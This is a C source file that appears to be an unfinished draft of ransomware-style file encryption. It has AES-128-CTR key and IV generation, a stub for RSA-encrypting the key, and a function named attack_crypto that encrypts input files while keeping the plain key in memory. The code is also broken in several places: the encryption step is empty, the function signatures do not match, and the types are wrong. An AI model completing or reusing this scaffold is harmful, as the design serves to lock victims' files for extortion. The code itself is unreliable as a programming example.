#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <stdbool.h>

#include "get_dir.h"

#define KEY_SIZE 16
#define IV_SIZE 16
#define MAX_PATH 260

/* Global variable for AES key */
char *aes_key = NULL;

/* Error handler */
void handle_error(const char *msg)
{
    fprintf(stderr, "Error: %s\n", msg);
    exit(EXIT_FAILURE);
}

/* Generate a 16-byte IV for AES-128-CTR: 8-byte nonce + 8-byte counter initialized to 0 */
void make_ctr_iv(unsigned char iv[16]) {
    uint64_t nonce;
    uint64_t counter = 0;

    if (RAND_bytes((unsigned char*)&nonce, sizeof(nonce)) != 1)
        handle_error("RAND_bytes failed for nonce");

    //Convert to big-endian for CTR mode
    for (int i = 0; i < 8; i++) {
        iv[i] = (nonce >> (56 - i * 8)) & 0xFF;
        iv[8 + i] = (counter >> (56 - i * 8)) & 0xFF;
    }
}

/* Save generated key to a .bin file */
int save_key_to_file(const char *path, const unsigned char *key, size_t key_len) {
    FILE *f = fopen(path, "wb");
    if (!f) return 0;

    if (fwrite(key, 1, key_len, f) != key_len) {
        fclose(f);
        return 0;
    }

    fclose(f);
    return 1;
}

int rsa_encrypt_key(){
    return 0;
}


/* Encrypt a file with AES-128-CTR */
int encrypt_file_aes_ctr(const char *source, const char *target)
{
    FILE *infile = fopen(source, "rb");
    if (!infile) handle_error("Cannot open input file");

    FILE *outfile = fopen(target, "wb");
    if (!outfile) {
        fclose(infile);
        handle_error("Cannot open output file");
    }

    unsigned char key[KEY_SIZE];
    unsigned char iv[IV_SIZE];

    // Generate random key and IV 
    if (RAND_bytes(key, KEY_SIZE) != 1) handle_error("RAND_bytes failed for key");
    make_ctr_iv(iv);

    // Write IV at the start of the file
    if (fwrite(iv, 1, IV_SIZE, outfile) != IV_SIZE) handle_error("Failed to write IV");

    /* ENCRYPTION */

    // Cleanup
    fclose(infile);
    fclose(outfile);

    return 0;
}

void clear_key_memory() {
    
}

int attack_crypto(const char *input_file, const char *output_file)
{
    if (aes_key == NULL) {
        /* TODO: keygen */
        aes_key = "1";

        /* TODO: save encrypted key to file, keep plain key in memory */
        char *encrypted_key = rsa_encrypt_key();
        save_key_to_file("key_location", encrypted_key, 128);
    }

    /* Encrypt file */
    encrypt_file_aes_ctr(input_file, output_file, aes_key);

    return 0;
}

// Using MSVC OpenSSL with MinGW - FIX!
